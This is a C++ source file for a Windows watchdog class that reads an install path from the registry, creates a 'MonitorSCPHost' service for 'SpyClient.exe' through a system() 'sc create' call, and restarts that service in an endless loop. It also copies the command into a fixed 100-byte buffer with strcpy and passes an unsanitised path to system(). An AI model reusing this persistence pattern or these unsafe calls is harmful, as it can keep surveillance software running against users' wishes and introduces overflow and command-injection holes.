// MonCtrl.cpp: implementation of the CMonCtrl class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MonCtrl.h"
#include "string.h"
#include "stdio.h"
#include "psapi.h"
#include <process.h>
#include <winsvc.h>

#pragma comment( lib, "psapi" )
#pragma comment( lib, "winmm" )
#pragma comment(lib,"Advapi32.lib")

#include <string>
#include <vector>
using namespace std;



//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

//#include "pch.h"

//#ifdef USE_PAGES
//////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////

CMonCtrl* CMonCtrl::_instance = 0;

CMonCtrl* CMonCtrl::Instance()
{
	if (_instance == 0)
	{
		_instance = new CMonCtrl;
	}
	return _instance;
}

CMonCtrl::CMonCtrl()
{



}

CMonCtrl::~CMonCtrl()
{

}

string CMonCtrl::GetInstallPath()
{
	HKEY hKey = 0;
	char buf[255] = {0};
	DWORD dwType = 0;
	DWORD dwBufSize = 255;//sizeof(buf);
	cout<<"sizebuf:"<<dwBufSize<<endl;
	CString subkey = _T("Software\\MoniClient");

	if( RegOpenKey(HKEY_CLASSES_ROOT,subkey,&hKey) == ERROR_SUCCESS)
	{
		dwType = REG_SZ;
		if(RegQueryValueEx(hKey,_T("InstallPath"),0, &dwType, (BYTE*)buf, &dwBufSize) == ERROR_SUCCESS)
		{
			int i=0;
			while(buf[2*i]){
				buf[i]=buf[2*i];
				i++;
			}
			cout << "key value is '" << buf << "'\n";
		}
		RegCloseKey(hKey);
	}
	return buf;
}


bool CMonCtrl::Shouhu(){

	InstallPath = GetInstallPath()+"\\";

	// 打开服务管理对象
	SC_HANDLE hSC = ::OpenSCManager( NULL,
		NULL, GENERIC_EXECUTE);
	if( hSC == NULL)
	{
		TRACE( _T("open SCManager error"));
		return FALSE;
	}
	cout<<"!!!";
	// 打开W32Time服务。
	SC_HANDLE hSvc = ::OpenService( hSC, _T("MonitorSCPHost"),
		SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	if( hSvc == NULL)
	{
		char test[100]={0};
		strcpy(test,("sc create MonitorSCPHost binPath= \"" + InstallPath + "SpyClient.exe\"").c_str());
		Releaseinfo(test);
		system(("sc create MonitorSCPHost binPath= \"" + InstallPath + "SpyClient.exe\"").c_str());
		hSvc = ::OpenService( hSC, _T("MonitorSCPHost"),SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	}
	// 获得服务的状态
	SERVICE_STATUS status;
	while(1){
		::Sleep(1000);
		if( ::QueryServiceStatus( hSvc, &status) == FALSE ||  status.dwCurrentState != SERVICE_RUNNING)
		{
			cout<<"SERVICE_STOPPED"<<endl;
			// 启动服务
			if( ::StartService( hSvc, NULL, NULL) == FALSE)
			{
				TRACE( _T("start service error。"));
				//::CloseServiceHandle( hSvc);
				//::CloseServiceHandle( hSC);
				//return FALSE;
			}
			//else if((::OpenService( hSC, _T("WindowsManagement"),SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP))==FALSE)//服务已经被删除
			//{
			//	CreateService(hSC,_T("AMyService"),_T("AMyService"),SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,_T("C:\\a.exe"),NULL,NULL,NULL,NULL,NULL);//创建服务
			//	cout<<"create!"<<endl;
			//}
			// 等待服务启动
			int i = 0;
			while( i<10 && ::QueryServiceStatus( hSvc, &status) == TRUE)
			{
				i++;
				::Sleep(500);
				if( status.dwCurrentState == SERVICE_RUNNING)
				{
					;//AfxMessageBox( _T("start success。"));
					//::CloseServiceHandle( hSvc);
					//::CloseServiceHandle( hSC);
					break;
				}
			}
		}
		else
			cout<<"status is "<<status.dwCurrentState<<endl;

	}
	TRACE( _T("start error。"));
	::CloseServiceHandle( hSvc);
	::CloseServiceHandle( hSC);
}

//////////////////////////////////////////////////////////////////////////
// 初始化
//
BOOL CMonCtrl::DW_Init()
{
	Shouhu();

	return TRUE;
}


BOOL CMonCtrl::DW_Destory()
{

	return TRUE;
}

void Releaseinfo(char *infostr)
{
	if(0)
	{
		FILE *fp;
		fp = fopen("C:\\SpyClient123.log","a+");
		if(fp == NULL)
		{
			cout<<"file open fail"<<endl;
		}

		fprintf(fp,"%s\n",infostr);
		fclose(fp);
	}
}